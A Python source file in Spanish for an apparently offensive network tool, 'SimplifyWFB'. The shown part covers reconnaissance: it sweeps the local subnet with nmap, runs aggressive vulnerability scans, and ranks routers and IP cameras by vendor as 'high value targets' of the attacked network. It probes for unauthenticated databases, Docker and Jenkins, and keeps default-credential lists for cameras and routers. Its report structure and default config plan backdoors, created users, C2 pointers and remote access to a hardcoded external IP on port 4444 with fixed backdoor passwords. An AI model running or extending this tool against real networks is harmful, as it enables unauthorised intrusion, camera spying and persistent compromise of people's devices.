#!/usr/bin/env python3
"""
Simplified WiFi Breaker - Script Simplificado de Pentesting
Contiene solo las funciones básicas: Full Scan y Pentest Frío
"""

import subprocess
import json
import time
import threading
import os
import tempfile
import sys
import base64
from typing import Dict, List, Any, Optional
from pathlib import Path
import re
import socket
import ipaddress
from datetime import datetime

class SimplifyWFB:
    """Script simplificado de pentesting con 4 fases básicas"""
    
    def __init__(self):
        self.start_time = time.time()
        self.config_data = self._load_config()
        self.report = {
            'metadata': {
                'script_name': 'SimplifyWFB',
                'version': '1.0.0',
                'start_time': datetime.now().isoformat(),
                'mode': None,  # 'full' o 'cold'
                'target_network': None,
                'local_ip': None,
                'external_ip': self.config_data['remote_access']['external_ip'],
                'external_port': self.config_data['remote_access']['external_port']
            },
            'phase_1_reconnaissance': {
                'status': 'pending',
                'hosts_discovered': [],
                'services_found': [],
                'technologies_detected': [],
                'network_topology': {},
                'errors': []
            },
            'phase_2_credentials': {
                'status': 'pending',
                'credentials_found': [],
                'attack_methods_used': [],
                'errors': []
            },
            'phase_3_lateral_movement': {
                'status': 'pending',
                'compromised_systems': [],
                'access_methods': [],
                'lateral_connections': [],
                'errors': []
            },
            'phase_4_persistence': {
                'status': 'pending',
                'persistent_access': [],
                'backdoors_created': [],
                'users_created': [],
                'remote_connections': [],
                'c2_pointers': [],
                'cameras_accessed': [],
                'router_access': [],
                'network_persistence': [],
                'errors': []
            },
            'phase_5_verification': {
                'status': 'pending',
                'persistence_checks': [],
                'access_verification': [],
                'errors': []
            },
            'cleanup': {
                'status': 'pending',
                'items_cleaned': [],
                'errors': []
            },
            'summary': {
                'total_hosts': 0,
                'compromised_hosts': 0,
                'persistent_access_points': 0,
                'total_credentials': 0,
                'execution_time': 0,
                'success_rate': 0.0
            }
        }
        
        # Configuración básica
        self.config = {
            'scan_timeout': 30,
            'max_threads': 10,
            'common_ports': [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080],
            'database_ports': [27017, 6379, 3306, 5432, 1433, 1521, 5984, 9200, 9300, 11211, 50070, 50075],
            'vulnerable_ports': [27017, 6379, 9200, 9300, 11211, 50070, 50075, 2375, 2376, 8080, 8443, 9000, 9001],
            'camera_ports': [80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 443, 554, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9999],
            'router_ports': [80, 443, 8080, 8443, 23, 22, 21, 161, 162],
            'default_users': ['admin', 'administrator', 'root', 'guest', 'user'],
            'default_passwords': ['admin', 'password', '123456', 'root', 'guest', ''],
            'camera_users': ['admin', 'administrator', 'root', 'guest', 'user', 'camera', 'ipcam', 'webcam', 'viewer', 'operator'],
            'camera_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'camera', 'ipcam', 'webcam', 'viewer', 'operator', '1234', '12345', '123456789', 'admin123', 'password123'],
            'router_users': ['admin', 'administrator', 'root', 'guest', 'user', 'admin', 'root', 'user', 'support', 'technician'],
            'router_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'admin', 'password', '1234', '12345', '123456', 'admin123', 'password123', 'support', 'technician']
        }
        
        # Detectar configuración de red automáticamente
        self._detect_network_config()
        
        # Configuración de red detectada
        self.network_config = {
            'detected': False,
            'network_range': None,
            'gateway': None,
            'dns_servers': [],
            'active_hosts': [],
            'network_type': 'unknown',
            'scan_parameters': {}
        }
    
    def _detect_network_config(self):
        """Detectar configuración de red automáticamente"""
        try:
            # Obtener IP local
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            self.report['metadata']['local_ip'] = local_ip
            
            # Calcular red objetivo
            ip_obj = ipaddress.IPv4Address(local_ip)
            network = ipaddress.IPv4Network(f"{ip_obj}/24", strict=False)
            self.report['metadata']['target_network'] = str(network)
            
            print(f"🌐 Red detectada: {self.report['metadata']['target_network']}")
            print(f"📍 IP local: {local_ip}")
            
        except Exception as e:
            print(f"❌ Error detectando red: {e}")
            self.report['metadata']['target_network'] = "192.168.1.0/24"
            self.report['metadata']['local_ip'] = "192.168.1.100"
    
    def auto_configure_network(self):
        """Autoconfiguración completa de la red antes del escaneo"""
        print("\n🔧 AUTO-CONFIGURACIÓN DE RED")
        print("=" * 50)
        
        try:
            # 1. Detectar información básica de red
            print("📡 Detectando información básica de red...")
            self._detect_basic_network_info()
            
            # 2. Detectar gateway
            print("🚪 Detectando gateway...")
            self._detect_gateway()
            
            # 3. Detectar servidores DNS
            print("🌐 Detectando servidores DNS...")
            self._detect_dns_servers()
            
            # 4. Escaneo rápido de hosts activos
            print("🔍 Escaneo rápido de hosts activos...")
            self._quick_host_discovery()
            
            # 5. Determinar tipo de red
            print("🏷️ Determinando tipo de red...")
            self._determine_network_type()
            
            # 6. Configurar parámetros de escaneo
            print("⚙️ Configurando parámetros de escaneo...")
            self._configure_scan_parameters()
            
            # 7. Mostrar resumen de configuración
            self._show_network_summary()
            
            self.network_config['detected'] = True
            print("\n✅ Auto-configuración completada exitosamente")
            
        except Exception as e:
            print(f"\n❌ Error en auto-configuración: {e}")
            self.network_config['detected'] = False
    
    def _detect_basic_network_info(self):
        """Detectar información básica de la red"""
        try:
            # Obtener IP local y máscara
            import netifaces
            
            # Obtener interfaz activa
            gateways = netifaces.gateways()
            default_interface = gateways['default'][netifaces.AF_INET][1]
            
            # Obtener información de la interfaz
            addrs = netifaces.ifaddresses(default_interface)
            ip_info = addrs[netifaces.AF_INET][0]
            
            local_ip = ip_info['addr']
            netmask = ip_info['netmask']
            
            # Calcular red
            import ipaddress
            network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
            
            self.network_config['network_range'] = str(network)
            self.report['metadata']['target_network'] = str(network)
            self.report['metadata']['local_ip'] = local_ip
            
            print(f"   📍 IP local: {local_ip}")
            print(f"   🎭 Máscara: {netmask}")
            print(f"   🌐 Red: {network}")
            
        except ImportError:
            print("   ⚠️ netifaces no disponible, usando método básico")
            # Fallback al método básico
            self._detect_network_config()
            self.network_config['network_range'] = self.report['metadata']['target_network']
        except Exception as e:
            print(f"   ❌ Error detectando info básica: {e}")
            self._detect_network_config()
            self.network_config['network_range'] = self.report['metadata']['target_network']
    
    def _detect_gateway(self):
        """Detectar gateway de la red"""
        try:
            import netifaces
            
            gateways = netifaces.gateways()
            gateway_ip = gateways['default'][netifaces.AF_INET][0]
            
            self.network_config['gateway'] = gateway_ip
            
            # Verificar conectividad del gateway
            if self._ping_host(gateway_ip):
                print(f"   ✅ Gateway detectado: {gateway_ip} (activo)")
            else:
                print(f"   ⚠️ Gateway detectado: {gateway_ip} (sin respuesta)")
                
        except ImportError:
            print("   ⚠️ netifaces no disponible, estimando gateway")
            # Estimar gateway basado en IP local
            local_ip = self.report['metadata']['local_ip']
            ip_parts = local_ip.split('.')
            estimated_gateway = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1"
            
            if self._ping_host(estimated_gateway):
                self.network_config['gateway'] = estimated_gateway
                print(f"   ✅ Gateway estimado: {estimated_gateway} (activo)")
            else:
                print(f"   ❌ Gateway estimado: {estimated_gateway} (sin respuesta)")
        except Exception as e:
            print(f"   ❌ Error detectando gateway: {e}")
    
    def _detect_dns_servers(self):
        """Detectar servidores DNS"""
        try:
            import netifaces
            
            # Obtener DNS de la interfaz activa
            gateways = netifaces.gateways()
            default_interface = gateways['default'][netifaces.AF_INET][1]
            
            # Leer /etc/resolv.conf en Linux o usar comando en Windows
            if os.name == 'nt':  # Windows
                result = self._run_command(['nslookup', 'google.com'], timeout=10)
                if result['success']:
                    # Extraer servidor DNS de la salida
                    lines = result['stdout'].split('\n')
                    for line in lines:
                        if 'Server:' in line:
                            dns_server = line.split(':')[1].strip()
                            self.network_config['dns_servers'].append(dns_server)
                            print(f"   🌐 DNS detectado: {dns_server}")
            else:  # Linux/Unix
                try:
                    with open('/etc/resolv.conf', 'r') as f:
                        for line in f:
                            if line.startswith('nameserver'):
                                dns_server = line.split()[1]
                                self.network_config['dns_servers'].append(dns_server)
                                print(f"   🌐 DNS detectado: {dns_server}")
                except FileNotFoundError:
                    print("   ⚠️ No se pudo leer /etc/resolv.conf")
                    
        except Exception as e:
            print(f"   ❌ Error detectando DNS: {e}")
    
    def _quick_host_discovery(self):
        """Descubrimiento rápido de hosts activos"""
        try:
            network = self.network_config['network_range']
            if not network:
                network = self.report['metadata']['target_network']
            
            print(f"   🔍 Escaneando {network}...")
            
            # Usar nmap para descubrimiento rápido
            command = [
                'nmap', '-sn', network,
                '--max-retries', '1',
                '--host-timeout', '5s',
                '--max-rtt-timeout', '1s'
            ]
            
            result = self._run_command(command, timeout=60)
            
            if result['success']:
                lines = result['stdout'].split('\n')
                active_hosts = []
                
                for line in lines:
                    if 'Nmap scan report for' in line:
                        # Extraer IP
                        ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                        if ip_match:
                            ip = ip_match.group(1)
                            active_hosts.append(ip)
                
                self.network_config['active_hosts'] = active_hosts
                print(f"   ✅ {len(active_hosts)} hosts activos detectados")
                
                # Mostrar algunos hosts
                for i, host in enumerate(active_hosts[:5]):
                    print(f"      • {host}")
                if len(active_hosts) > 5:
                    print(f"      • ... y {len(active_hosts) - 5} más")
            else:
                print("   ⚠️ Nmap falló, usando ping manual")
                self._manual_host_discovery()
                
        except Exception as e:
            print(f"   ❌ Error en descubrimiento rápido: {e}")
            self._manual_host_discovery()
    
    def _manual_host_discovery(self):
        """Descubrimiento manual de hosts con ping"""
        try:
            network = self.network_config['network_range']
            if not network:
                network = self.report['metadata']['target_network']
            
            import ipaddress
            network_obj = ipaddress.IPv4Network(network)
            
            active_hosts = []
            total_hosts = len(list(network_obj.hosts()))
            
            print(f"   🔍 Ping manual en {total_hosts} hosts...")
            
            # Escanear solo algunos hosts para no tardar mucho
            hosts_to_scan = list(network_obj.hosts())[:50]  # Máximo 50 hosts
            
            for ip in hosts_to_scan:
                if self._ping_host(str(ip)):
                    active_hosts.append(str(ip))
            
            self.network_config['active_hosts'] = active_hosts
            print(f"   ✅ {len(active_hosts)} hosts activos detectados (de {len(hosts_to_scan)} escaneados)")
            
        except Exception as e:
            print(f"   ❌ Error en descubrimiento manual: {e}")
    
    def _determine_network_type(self):
        """Determinar tipo de red basado en la configuración"""
        try:
            local_ip = self.report['metadata']['local_ip']
            gateway = self.network_config.get('gateway')
            
            # Analizar rangos de IP
            ip_parts = local_ip.split('.')
            first_octet = int(ip_parts[0])
            
            if first_octet == 10:
                network_type = 'corporate_lan'
            elif first_octet == 172 and 16 <= int(ip_parts[1]) <= 31:
                network_type = 'corporate_lan'
            elif first_octet == 192 and ip_parts[1] == '168':
                network_type = 'home_network'
            elif first_octet == 169 and ip_parts[1] == '254':
                network_type = 'link_local'
            else:
                network_type = 'unknown'
            
            # Verificar si es red pública
            if gateway and gateway.startswith('192.168.') or gateway.startswith('10.') or gateway.startswith('172.'):
                network_type += '_private'
            else:
                network_type += '_public'
            
            self.network_config['network_type'] = network_type
            print(f"   🏷️ Tipo de red: {network_type}")
            
        except Exception as e:
            print(f"   ❌ Error determinando tipo de red: {e}")
            self.network_config['network_type'] = 'unknown'
    
    def _configure_scan_parameters(self):
        """Configurar parámetros de escaneo basados en la red detectada"""
        try:
            network_type = self.network_config.get('network_type', 'unknown')
            active_hosts_count = len(self.network_config.get('active_hosts', []))
            
            # Configurar timeouts basados en el tipo de red
            if 'corporate_lan' in network_type:
                scan_timeout = 60  # Redes corporativas pueden ser más lentas
                max_threads = 5    # Menos threads para no sobrecargar
            elif 'home_network' in network_type:
                scan_timeout = 30  # Redes domésticas típicamente rápidas
                max_threads = 10   # Más threads para redes pequeñas
            else:
                scan_timeout = 45  # Default
                max_threads = 8
            
            # Ajustar timeouts basado en número de hosts
            if active_hosts_count > 20:
                scan_timeout = min(scan_timeout + 30, 120)  # Máximo 2 minutos
                max_threads = max(max_threads - 2, 3)       # Mínimo 3 threads
            elif active_hosts_count < 5:
                scan_timeout = max(scan_timeout - 15, 15)   # Mínimo 15 segundos
                max_threads = min(max_threads + 2, 15)      # Máximo 15 threads
            
            # Configurar puertos basado en tipo de red
            if 'corporate_lan' in network_type:
                # Redes corporativas: más puertos empresariales
                common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080, 8443, 9090]
            else:
                # Redes domésticas: puertos más comunes
                common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080]
            
            # Actualizar configuración
            self.config['scan_timeout'] = scan_timeout
            self.config['max_threads'] = max_threads
            self.config['common_ports'] = common_ports
            
            self.network_config['scan_parameters'] = {
                'timeout': scan_timeout,
                'max_threads': max_threads,
                'ports_count': len(common_ports),
                'estimated_duration': active_hosts_count * scan_timeout / max_threads
            }
            
            print(f"   ⚙️ Timeout de escaneo: {scan_timeout}s")
            print(f"   ⚙️ Máximo threads: {max_threads}")
            print(f"   ⚙️ Puertos a escanear: {len(common_ports)}")
            print(f"   ⚙️ Duración estimada: {self.network_config['scan_parameters']['estimated_duration']:.1f}s")
            
        except Exception as e:
            print(f"   ❌ Error configurando parámetros: {e}")
    
    def _show_network_summary(self):
        """Mostrar resumen de la configuración de red"""
        print("\n📊 RESUMEN DE CONFIGURACIÓN DE RED")
        print("=" * 50)
        print(f"🌐 Red objetivo: {self.network_config.get('network_range', 'No detectada')}")
        print(f"📍 IP local: {self.report['metadata'].get('local_ip', 'No detectada')}")
        print(f"🚪 Gateway: {self.network_config.get('gateway', 'No detectado')}")
        print(f"🏷️ Tipo de red: {self.network_config.get('network_type', 'Desconocido')}")
        print(f"🔍 Hosts activos: {len(self.network_config.get('active_hosts', []))}")
        print(f"🌐 Servidores DNS: {len(self.network_config.get('dns_servers', []))}")
        
        scan_params = self.network_config.get('scan_parameters', {})
        if scan_params:
            print(f"⏱️ Duración estimada: {scan_params.get('estimated_duration', 0):.1f} segundos")
            print(f"🧵 Threads configurados: {scan_params.get('max_threads', 0)}")
            print(f"🔌 Puertos a escanear: {scan_params.get('ports_count', 0)}")
    
    def _load_config(self):
        """Cargar configuración desde archivo config.json"""
        try:
            with open('config.json', 'r', encoding='utf-8') as f:
                return json.load(f)
        except FileNotFoundError:
            print("⚠️ Archivo config.json no encontrado, usando configuración por defecto")
            return {
                'remote_access': {
                    'external_ip': '184.107.168.100',
                    'external_port': 4444
                },
                'persistence': {
                    'ssh_port': 2222,
                    'vpn_port': 1194,
                    'web_port': 8080
                },
                'credentials': {
                    'ssh_user': 'svc_ssh',
                    'ssh_password': 'SSH_P@ssw0rd_2024!',
                    'web_user': 'admin',
                    'web_password': 'Web_P@ssw0rd_2024!'
                }
            }
        except Exception as e:
            print(f"❌ Error cargando configuración: {e}")
            return self._load_config()  # Recursión para usar configuración por defecto
    
    def _run_command(self, command: List[str], timeout: int = 30) -> Dict[str, Any]:
        """Ejecutar comando y capturar salida"""
        try:
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='replace'
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'success': result.returncode == 0
            }
            
        except subprocess.TimeoutExpired:
            return {'stdout': '', 'stderr': 'Timeout', 'return_code': -1, 'success': False}
        except Exception as e:
            return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False}
    
    def phase_1_reconnaissance(self):
        """Fase 1: Reconocimiento completo de la red"""
        print("\n🔍 FASE 1: RECONOCIMIENTO COMPLETO")
        print("=" * 50)
        
        self.report['phase_1_reconnaissance']['status'] = 'running'
        
        try:
            # 1. Descubrimiento de hosts con nmap
            # 1. Obtener IP pública de la red atacada
            print("🌍 Detectando IP pública de la red...")
            public_ip = self._get_public_ip()
            self.report['phase_1_reconnaissance']['public_ip'] = public_ip
            print(f"📍 IP pública detectada: {public_ip}")
            
            # 2. Descubrir hosts en la red
            print("📡 Descubriendo hosts en la red...")
            hosts = self._discover_hosts()
            self.report['phase_1_reconnaissance']['hosts_discovered'] = hosts
            
            # 2.1. Detectar objetivos de alto valor automáticamente
            print("🎯 Identificando objetivos de alto valor...")
            high_value_targets = self._identify_high_value_targets(hosts)
            self.report['phase_1_reconnaissance']['high_value_targets'] = high_value_targets
            
            if high_value_targets:
                print(f"🎯 OBJETIVOS DE ALTO VALOR DETECTADOS: {len(high_value_targets)}")
                for target in high_value_targets:
                    print(f"   • {target['ip']} - {target['type']} ({target['vendor']}) - Prioridad: {target['priority']}")
                print("")
            
            # 2. Escaneo de puertos y servicios
            print("🔍 Escaneando puertos y servicios...")
            services = self._scan_services(hosts)
            self.report['phase_1_reconnaissance']['services_found'] = services
            
            # 3. Detección de tecnologías
            print("🛠️ Detectando tecnologías...")
            technologies = self._detect_technologies(services)
            self.report['phase_1_reconnaissance']['technologies_detected'] = technologies
            
            # 4. Detectar bases de datos y servicios vulnerables
            print("🗄️ Detectando bases de datos y servicios vulnerables...")
            vulnerable_services = self._detect_vulnerable_services(services)
            self.report['phase_1_reconnaissance']['vulnerable_services'] = vulnerable_services
            
            # 5. Detectar redes relacionadas y segmentadas
            print("🌐 Detectando redes relacionadas y segmentadas...")
            related_networks = self._detect_related_networks(hosts, services)
            self.report['phase_1_reconnaissance']['related_networks'] = related_networks
            
            # 6. Mapeo de topología
            print("🗺️ Mapeando topología de red...")
            topology = self._map_network_topology(hosts)
            self.report['phase_1_reconnaissance']['network_topology'] = topology
            
            self.report['phase_1_reconnaissance']['status'] = 'completed'
            print(f"✅ Reconocimiento completado: {len(hosts)} hosts, {len(services)} servicios")
            
        except Exception as e:
            self.report['phase_1_reconnaissance']['status'] = 'error'
            self.report['phase_1_reconnaissance']['errors'].append(str(e))
            print(f"❌ Error en reconocimiento: {e}")
    
    def _identify_high_value_targets(self, hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Identificar automáticamente objetivos de alto valor basado en MAC vendors y IPs"""
        high_value_targets = []
        
        # Patrones de fabricantes de alto valor
        high_value_vendors = {
            'huawei': {'priority': 'CRITICAL', 'type': 'router', 'description': 'Router Principal'},
            'cisco': {'priority': 'CRITICAL', 'type': 'router', 'description': 'Router Cisco'},
            'netgear': {'priority': 'HIGH', 'type': 'router', 'description': 'Router Netgear'},
            'tp-link': {'priority': 'HIGH', 'type': 'router', 'description': 'Router TP-Link'},
            'linksys': {'priority': 'HIGH', 'type': 'router', 'description': 'Router Linksys'},
            'asus': {'priority': 'HIGH', 'type': 'router', 'description': 'Router Asus'},
            'hangzhou ezviz': {'priority': 'HIGH', 'type': 'camera', 'description': 'Cámara EZVIZ/Hikvision'},
            'hikvision': {'priority': 'HIGH', 'type': 'camera', 'description': 'Cámara Hikvision'},
            'dahua': {'priority': 'HIGH', 'type': 'camera', 'description': 'Cámara Dahua'},
            'axis': {'priority': 'HIGH', 'type': 'camera', 'description': 'Cámara Axis'},
            'foscam': {'priority': 'MEDIUM', 'type': 'camera', 'description': 'Cámara Foscam'},
            'd-link': {'priority': 'MEDIUM', 'type': 'camera', 'description': 'Cámara D-Link'},
            'intelbras': {'priority': 'MEDIUM', 'type': 'camera', 'description': 'Cámara Intelbras'}
        }
        
        # IPs específicas de alto valor (gateways comunes)
        high_value_ips = ['192.168.1.1', '192.168.0.1', '10.0.0.1', '172.16.0.1']
        
        for host in hosts:
            ip = host.get('ip', '')
            vendor = host.get('vendor', '').lower()
            mac = host.get('mac', '')
            
            # Verificar por IP específica
            if ip in high_value_ips:
                high_value_targets.append({
                    'ip': ip,
                    'type': 'gateway',
                    'vendor': vendor or 'Unknown',
                    'priority': 'CRITICAL',
                    'description': f'Gateway detectado en {ip}',
                    'mac': mac,
                    'detection_method': 'ip_based'
                })
                continue
            
            # Verificar por vendor
            for vendor_pattern, info in high_value_vendors.items():
                if vendor_pattern in vendor:
                    high_value_targets.append({
                        'ip': ip,
                        'type': info['type'],
                        'vendor': vendor,
                        'priority': info['priority'],
                        'description': info['description'],
                        'mac': mac,
                        'detection_method': 'vendor_based'
                    })
                    break
        
        # Ordenar por prioridad
        priority_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2}
        high_value_targets.sort(key=lambda x: priority_order.get(x['priority'], 3))
        
        return high_value_targets

    def _get_public_ip(self) -> str:
        """Obtener la IP pública de la red atacada"""
        try:
            import urllib.request
            import json
            
            # Servicios para obtener IP pública
            services = [
                'https://api.ipify.org',
                'https://ipinfo.io/ip',
                'https://icanhazip.com',
                'https://ident.me',
                'https://api.my-ip.io/ip'
            ]
            
            for service in services:
                try:
                    with urllib.request.urlopen(service, timeout=5) as response:
                        ip = response.read().decode('utf-8').strip()
                        if self._is_valid_ip(ip):
                            return ip
                except Exception:
                    continue
            
            return "No detectada"
            
        except Exception as e:
            print(f"❌ Error obteniendo IP pública: {e}")
            return "Error"
    
    def _is_valid_ip(self, ip: str) -> bool:
        """Validar si una IP es válida"""
        try:
            import ipaddress
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def _discover_hosts(self) -> List[Dict[str, Any]]:
        """Descubrir hosts en la red"""
        hosts = []
        network = self.report['metadata']['target_network']
        
        try:
            # Usar nmap para descubrimiento rápido
            command = ['nmap', '-sn', network, '--max-retries', '1', '--host-timeout', '10s']
            result = self._run_command(command, timeout=60)
            
            if result['success']:
                lines = result['stdout'].split('\n')
                for line in lines:
                    if 'Nmap scan report for' in line:
                        # Extraer IP
                        ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                        if ip_match:
                            ip = ip_match.group(1)
                            
                            # Obtener MAC si está disponible
                            mac = None
                            vendor = None
                            
                            host_info = {
                                'ip': ip,
                                'mac': mac,
                                'vendor': vendor,
                                'status': 'up',
                                'discovery_method': 'nmap_ping'
                            }
                            hosts.append(host_info)
            
            # Si nmap falla, usar ping manual
            if not hosts:
                print("⚠️ Nmap falló, usando ping manual...")
                network_obj = ipaddress.IPv4Network(network)
                for ip in network_obj.hosts():
                    if self._ping_host(str(ip)):
                        hosts.append({
                            'ip': str(ip),
                            'mac': None,
                            'vendor': None,
                            'status': 'up',
                            'discovery_method': 'ping'
                        })
            
        except Exception as e:
            print(f"❌ Error descubriendo hosts: {e}")
        
        return hosts
    
    def _ping_host(self, ip: str) -> bool:
        """Hacer ping a un host"""
        try:
            command = ['ping', '-c', '1', '-W', '1', ip]
            result = self._run_command(command, timeout=5)
            return result['success']
        except:
            return False
    
    def _scan_services(self, hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Escanear servicios en los hosts con priorización estratégica"""
        services = []
        
        # Obtener objetivos de alto valor del config
        high_value_targets = self.config_data.get('stealth', {}).get('scan_evasion', {}).get('target_priority', {}).get('high_value_targets', [])
        
        for host in hosts:
            ip = host['ip']
            is_high_value = ip in high_value_targets
            
            if is_high_value:
                print(f"🎯 ESCANEANDO OBJETIVO DE ALTO VALOR: {ip}")
            else:
                print(f"🔍 Escaneando {ip}...")
            
            try:
                # Escaneo completo de puertos comunes + bases de datos + vulnerables
                all_ports = list(set(
                    self.config['common_ports'] + 
                    self.config['database_ports'] + 
                    self.config['vulnerable_ports'] +
                    self.config['camera_ports'] +
                    self.config['router_ports']
                ))
                
                # Para objetivos de alto valor, usar escaneo más agresivo
                if is_high_value:
                    # Usar opciones de Nmap del config para escaneo agresivo
                    nmap_options = self.config_data.get('stealth', {}).get('scan_evasion', {}).get('nmap_options', '-sS -T4 -A --top-ports 200 --version-intensity 5 --script vuln,default,auth')
                    command = ['nmap'] + nmap_options.split() + [ip]
                    timeout = 180  # Más tiempo para objetivos críticos
                else:
                    ports_to_scan = ','.join(map(str, all_ports))
                    command = ['nmap', '-sS', '-O', '-sV', '-p', ports_to_scan, ip]
                    timeout = 120
                
                result = self._run_command(command, timeout=timeout)
                
                if result['success']:
                    # Parsear salida de nmap
                    host_services = self._parse_nmap_output(result['stdout'], ip)
                    services.extend(host_services)
                    
            except Exception as e:
                print(f"❌ Error escaneando {ip}: {e}")
        
        return services
    
    def _parse_nmap_output(self, output: str, host_ip: str) -> List[Dict[str, Any]]:
        """Parsear salida de nmap"""
        services = []
        lines = output.split('\n')
        
        for line in lines:
            if '/tcp' in line and 'open' in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_info = parts[0].split('/')
                    port = int(port_info[0])
                    protocol = port_info[1]
                    state = parts[1]
                    
                    service_info = {
                        'host': host_ip,
                        'port': port,
                        'protocol': protocol,
                        'state': state,
                        'service': 'unknown',
                        'version': 'unknown'
                    }
                    
                    # Extraer servicio y versión si están disponibles
                    if len(parts) > 2:
                        service_info['service'] = parts[2]
                    if len(parts) > 3:
                        service_info['version'] = ' '.join(parts[3:])
                    
                    services.append(service_info)
        
        return services
    
    def _detect_vulnerable_services(self, services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Detectar servicios vulnerables como bases de datos expuestas"""
        vulnerable_services = []
        
        for service in services:
            port = service.get('port')
            service_name = service.get('service', '').lower()
            host = service.get('host')
            
            # Detectar bases de datos y servicios vulnerables
            if port in self.config['database_ports'] or port in self.config['vulnerable_ports']:
                vulnerable_info = self._check_service_vulnerability(host, port, service_name)
                if vulnerable_info:
                    vulnerable_services.append(vulnerable_info)
        
        return vulnerable_services
    
    def _check_service_vulnerability(self, host: str, port: int, service_name: str) -> Optional[Dict[str, Any]]:
        """Verificar si un servicio es vulnerable"""
        try:
            # MongoDB (puerto 27017)
            if port == 27017:
                return self._check_mongodb_vulnerability(host, port)
            
            # Redis (puerto 6379)
            elif port == 6379:
                return self._check_redis_vulnerability(host, port)
            
            # Elasticsearch (puertos 9200, 9300)
            elif port in [9200, 9300]:
                return self._check_elasticsearch_vulnerability(host, port)
            
            # Memcached (puerto 11211)
            elif port == 11211:
                return self._check_memcached_vulnerability(host, port)
            
            # Docker (puertos 2375, 2376)
            elif port in [2375, 2376]:
                return self._check_docker_vulnerability(host, port)
            
            # Jenkins (puerto 8080)
            elif port == 8080 and 'jenkins' in service_name:
                return self._check_jenkins_vulnerability(host, port)
            
            return None
            
        except Exception as e:
            print(f"❌ Error verificando vulnerabilidad {host}:{port}: {e}")
            return None
    
    def _check_mongodb_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Verificar MongoDB sin autenticación"""
        try:
            import socket
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                return {
                    'host': host,
                    'port': port,
                    'service': 'mongodb',
                    'vulnerability': 'No authentication required',
                    'severity': 'high',
                    'exploit_method': 'Direct connection',
                    'backdoor_created': False
                }
        except Exception:
            pass
        return None
    
    def _check_redis_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Verificar Redis sin autenticación"""
        try:
            import socket
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                return {
                    'host': host,
                    'port': port,
                    'service': 'redis',
                    'vulnerability': 'No authentication required',
                    'severity': 'high',
                    'exploit_method': 'Direct connection',
                    'backdoor_created': False
                }
        except Exception:
            pass
        return None
    
    def _check_elasticsearch_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Verificar Elasticsearch expuesto"""
        try:
            import urllib.request
            
            url = f"http://{host}:{port}/_cluster/health"
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(req, timeout=5) as response:
                if response.status == 200:
                    return {
                        'host': host,
                        'port': port,
                        'service': 'elasticsearch',
                        'vulnerability': 'Exposed API',
                        'severity': 'medium',
                        'exploit_method': 'HTTP API access',
                        'backdoor_created': False
                    }
        except Exception:
            pass
        return None
    
    def _check_memcached_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Verificar Memcached expuesto"""
        try:
            import socket
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                return {
                    'host': host,
                    'port': port,
                    'service': 'memcached',
                    'vulnerability': 'No authentication required',
                    'severity': 'medium',
                    'exploit_method': 'Direct connection',
                    'backdoor_created': False
                }
        except Exception:
            pass
        return None
    
    def _check_docker_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Verificar Docker daemon expuesto"""
        try:
            import urllib.request
            
            url = f"http://{host}:{port}/version"
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(req, timeout=5) as response:
                if response.status == 200:
                    return {
                        'host': host,
                        'port': port,
                        'service': 'docker',
                        'vulnerability': 'Exposed Docker daemon',
                        'severity': 'critical',
                        'exploit_method': 'Docker API access',
                        'backdoor_created': False
                    }
        except Exception:
            pass
        return None
    
    def _check_jenkins_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Verificar Jenkins expuesto"""
        try:
            import urllib.request
            
            url = f"http://{host}:{port}/"
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(req, timeout=5) as response:
                if response.status == 200:
                    content = response.read().decode('utf-8', errors='ignore')
                    if 'jenkins' in content.lower():
                        return {
                            'host': host,
                            'port': port,
                            'service': 'jenkins',
                            'vulnerability': 'Exposed Jenkins interface',
                            'severity': 'high',
                            'exploit_method': 'Web interface access',
                            'backdoor_created': False
                        }
        except Exception:
            pass
        return None
    
